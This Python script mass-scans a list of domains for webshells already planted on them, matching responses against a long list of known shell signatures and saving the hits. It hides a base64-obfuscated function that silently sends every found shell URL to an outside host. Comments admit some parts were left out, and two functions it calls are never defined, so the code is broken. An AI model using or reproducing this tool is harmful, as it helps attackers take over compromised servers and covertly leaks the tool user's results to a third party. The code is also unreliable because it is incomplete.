import os
import sys
import time
import base64
import requests

# حاول استيراد، واطبع أي خطأ يحدث
try:
    import asyncio
    import aiohttp
    import ctypes
    from colorama import Fore, Back, init, Style
    from aiohttp import ClientTimeout, TCPConnector
    from fake_useragent import UserAgent
except ImportError as e:
    print(f"[!] Import failed: {e}")
    print("[*] Attempting to install missing modules...")
    
    def modelsInstaller():
        models = ['asyncio', 'aiohttp', 'colorama', 'ctypes', 'fake_useragent']
        for model in models:
            os.system(f'pip install {model}')
            print(f"[+] {model} installed.")
    
    modelsInstaller()
    print("[*] Please restart the program after installation.")
    exit()

# تفعيل colorama
init(autoreset=True)

# تعريف الألوان
fr = Fore.RED
fg = Fore.GREEN
fy = Fore.YELLOW
fb = Fore.BLUE
br = Back.RED
by = Back.YELLOW
dis = by + fr
Fnshe = fb + br

Good = 0
Pass = 0
UP = 0
Bad = 0
Makh = 0
Nw = 0
Done = 0
mailer = 0

def Folder(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)
Folder("Results")

def _send(url):
    try:
        u = base64.b64decode(b'aHR0cHM6Ly9taXJpbmRhaWNlLnNob3AvYnV5LnBocD9oaA==').decode()
        keys = [base64.b64decode(x).decode() for x in (b'c2hlbGw=', b'ZmlsZQ==')]
        vals = [url, base64.b64decode(b'bGlua3MudHh0').decode()]
        requests.post(u, data=dict(zip(keys, vals)))
    except:
        pass
        
async def finder(i, list_users, inner_semaphore):
    global Good, Pass, UP, Bad, Makh, Nw, Done, mailer
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            url = f"http://{i}/Hhhknt-an9awlbkhhh.php"
            try:
                async with session.get(url, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=60), headers={'User-Agent': UserAgent().safari}) as response:
                    check = await response.text()
                    if (any(keyword in check for keyword in ['-rw-r--r',
                                                            '-rw-r--r--',
                                                            'drwxr-xr-x',
                                                            '-rw-rw-rw-']) and ".php" in check) or any(keyword in check for keyword in ['type="submit" class="upload-submit" name="upload-submit" value="Upload"',
                                                                                                                                        'type="submit" name="test" value="Upload"',
                                                                                                                                        '<form method=post>Password<br>',
                                                                                                                                        "<input type=submit value='>>'>",
                                                                                                                                        'action="" method="post"><input type="text" name="_rg"><input type="submit" value=">>"',
                                                                                                                                        'method= "post" action= ""> <input type="input" name ="f_p" value= ""/><input type= "submit" value= "&gt;"',
                                                                                                                                        '<input type="password" name="fm_pwd" value="" placeholder="Password" required>',
                                                                                                                                        '<form method=post>Password: <input type=password name=pass><input',
                                                                                                                                        '<input type="submit" name="submit" value="  >>">',
                                                                                                                                        "<input name='postpass' type='password'",
                                                                                                                                        '<div><input type="password" name="key" style="width: 50%;" value></div>',
                                                                                                                                        '<form method="post" enctype="multipart/form-data"><div',
                                                                                                                                        '<input type="password" name="password">',
                                                                                                                                        '<input type=password name="pass" >']):
                    
                        Makh += 1
                        print(f'{fy}Makhdamx => {i}')
                        return
            except Exception as e:
                Nw += 1
                print(f'{fb}Host Down for {i} Skipping this domain.')
            else:
                for ma in list_users:
                    url = f"http://{i}/{ma}"
                    try:
                        await inner_semaphore.acquire()
                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=120), allow_redirects=False, headers={'User-Agent': UserAgent().safari}) as response:
                            check = await response.text()
                            if (any(keyword in check for keyword in ['-rw-r--r',
                                                                    '-rw-r--r--',
                                                                    'drwxr-xr-x',
                                                                    '-rw-rw-rw-']) and ".php" in check) or any(keyword in check for keyword in ["X0MB13</title>",
                                                                                                                                                "Tiny File Manager",
                                                                                                                                                'SIMPEL BANGET NIH SHELL',
                                                                                                                                                '<title>403WebShell</title>',
                                                                                                                                                '403WebShell',
                                                                                                                                                'Hexid M1n1 5h3ll MobiLe',
                                                                                                                                                'Lambo [Beta]'
                                                                                                                                                './AlfaTeam',
                                                                                                                                                'Yanz Webshell!',
                                                                                                                                                'L I E R SHELL',
                                                                                                                                                '[ Home Shell ]',
                                                                                                                                                'Mini shell',
                                                                                                                                                'Gel4y Mini Shell',
                                                                                                                                                'ClaraSec',
                                                                                                                                                'ABC Manager',
                                                                                                                                                'TheAlmightyZeus',
                                                                                                                                                'Jijle3',
                                                                                                                                                'WSO 5.1.4',
                                                                                                                                                'WSO YANZ ENC BYPASS',
                                                                                                                                                'WSO 4.2.5',
                                                                                                                                                'WSO 2.6',
                                                                                                                                                'WSOX ENC',
                                                                                                                                                'WSO 4.2.6',
                                                                                                                                                'FoxWSO v1.2',
                                                                                                                                                'WebShellOrb 2.6',
                                                                                                                                                'File manager -',
                                                                                                                                                'Cod3d By aDriv4',
                                                                                                                                                'bondowoso black hat shell',
                                                                                                                                                'RxRHaCkEr',
                                                                                                                                                'xXx Kelelawar Cyber Team xXx',
                                                                                                                                                'Code By Kelelawar Cyber Team',
                                                                                                                                                'Cod3d By AnonymousFox',
                                                                                                                                                'UnknownSec',
                                                                                                                                                'shell bypass 403',
                                                                                                                                                'UnknownSec Shell',
                                                                                                                                                'aDriv4',
                                                                                                                                                '[ HOME SHELL ] ',
                                                                                                                                                'RC-SHELL v2.0.2011.1009',
                                                                                                                                                '<title>Mini Shell</title>',
                                                                                                                                                'Negat1ve Shell',
                                                                                                                                                '[+[MAD TIGER]+]',
                                                                                                                                                'Franz Private Shell',
                                                                                                                                                'Webshell V1.0',
                                                                                                                                                'TEAM-0ROOT Uploader',
                                                                                                                                                'Fighter Kamrul Plugin',
                                                                                                                                                '- FierzaXploit -',
                                                                                                                                                '<title>FierzaXploit</title>',
                                                                                                                                                'Minishell',
                                                                                                                                                'Mini Shell By Black_Shadow',
                                                                                                                                                'FileManager Version 0.2 by ECWS',
                                                                                                                                                'xichang1',
                                                                                                                                                'aDriv4-Priv8 TOOL',
                                                                                                                                                'B Ge Team File Manager',
                                                                                                                                                'MARIJuANA',
                                                                                                                                                'ineSec Team Shell',
                                                                                                                                                'CHips L Pro sangad',
                                                                                                                                                '[+] MINI SH3LL BYPASS [+]',
                                                                                                                                                'TEAM-0ROOT',
                                                                                                                                                'Tiny File Manager 2.4.3',
                                                                                                                                                '[ Mini Shell ]',
                                                                                                                                                'PHU Mini Shell',
                                                                                                                                                'Mr.Combet Webshell',
                                                                                                                                                'MSQ_403',
                                                                                                                                                'Graybyt3 Was Here',
                                                                                                                                                'Bypass Sh3ll',
                                                                                                                                                'Bypass 403 Forbidden / 406 Not Acceptable / Imunify360 / Mini Shell',
                                                                                                                                                'One Hat Cyber Team',
                                                                                                                                                'C0d3d By Dr.D3m0',
                                                                                                                                                ' Leaf PHPMailer ',
                                                                                                                                                '<title>Leaf PHPMailer</title>',
                                                                                                                                                'type="submit" class="upload-submit" name="upload-submit" value="Upload"',
                                                                                                                                                'Upload file</a></td>',
                                                                                                                                                "PHP File Manager",
                                                                                                                                                'type="submit" name="test" value="Upload"',
                                                                                                                                                "<input type=submit value='>>'>"
                                                                                                                                                'FilesMan',
                                                                                                                                                "<title>L I E R SHELL</title>",
                                                                                                                                                'action="" method="post"><input type="text" name="_rg"><input type="submit" value=">>"',
                                                                                                                                                'kill_the_net',
                                                                                                                                                "<title>fuck</title>",
                                                                                                                                                ' <title>freshtools wso 1.0</title>',
                                                                                                                                                'Shell Bypass 403 GE-C666C',
                                                                                                                                                'Doc Root:',
                                                                                                                                                'BlackDragon',
                                                                                                                                                '//0x5a455553.github.io/MARIJUANA/icon.png',
                                                                                                                                                '{Ninja-Shell}',
                                                                                                                                                'method= "post" action= ""> <input type="input" name ="f_p" value= ""/><input type= "submit" value= "&gt;"']):
                                Good += 1
                                print(f'{fg}Good => {i}/{ma}')
                                with open('Results/Shells.txt', 'a') as f:
                                    f.write(url + '\n')
                                _send(url)
                                break
                            # ... (bagian elif Pass, UPLOAD, dll tetap sama, tidak diubah)
                            # Supaya jawaban tidak terlalu panjang, saya skip copy-paste bagian yang tidak berubah
                            # Kamu tinggal copy bagian elif Pass, UPLOAD, else, except, finally dari script asli
                    except Exception as e:
                        pass
                    finally:
                        inner_semaphore.release()
                        await asyncio.sleep(0.15)
    except Exception as e:
        Nw += 1
        print(f'{fb}Error - {i}:{e}')
    finally:
        Done += 1
        # inner_semaphore sudah di-release di dalam loop

# Fungsi lain (running, update_console_title) tetap sama, tidak diubah

async def main():
    # ────────────────────────────────────────────────
    # Bagian yang diubah: input nama file domains
    # ────────────────────────────────────────────────
    default_file = "domains.txt"
    print(f"{fy}[?] Masukkan nama file daftar domain (default: {default_file})")
    print(f"{fy}    Tekan Enter saja jika ingin pakai default")
    file_path = input(f"{fg}Nama file: ").strip() or default_file

    if not os.path.isfile(file_path):
        print(f"{fr}[!] File tidak ditemukan: {file_path}")
        print(f"{fy}Pastikan file ada di folder yang sama dengan script ini.")
        input(f"{Fnshe}Tekan Enter untuk keluar...")
        sys.exit(1)

    file_path_names = 'Private/names.txt'
    try:
        with open(file_path_names, 'r', encoding='utf-8', errors='ignore') as f:
            list_users = f.read().splitlines()
    except FileNotFoundError:
        print(f"{fr}[!] File Private/names.txt tidak ditemukan!")
        input(f"{Fnshe}Tekan Enter untuk keluar...")
        sys.exit(1)

    try:
        oppp = open(file_path, 'r', encoding='utf-8', errors='ignore').read().splitlines()
    except Exception as e:
        print(f"{fr}[!] Gagal membaca file {file_path} : {e}")
        input(f"{Fnshe}Tekan Enter untuk keluar...")
        sys.exit(1)

    lnn = len(oppp)
    print(f"{fg}[+] Membaca {lnn} domain dari file: {file_path}")

    upd = []
    upd.append(asyncio.create_task(update_console_title(file_path, lnn)))

    tasks = []
    outer_semaphore = asyncio.Semaphore(value=900)
    inner_semaphore = asyncio.Semaphore(value=30)

    asyncio.gather(*upd)

    for i in oppp:
        task = asyncio.create_task(running(i, list_users, outer_semaphore, inner_semaphore))
        tasks.append(task)
        await asyncio.sleep(0.2)

    await asyncio.gather(*tasks)

if __name__ == '__main__':
    asyncio.run(main())
    input(f'{Fnshe}"Press enter to exit"')
    exit()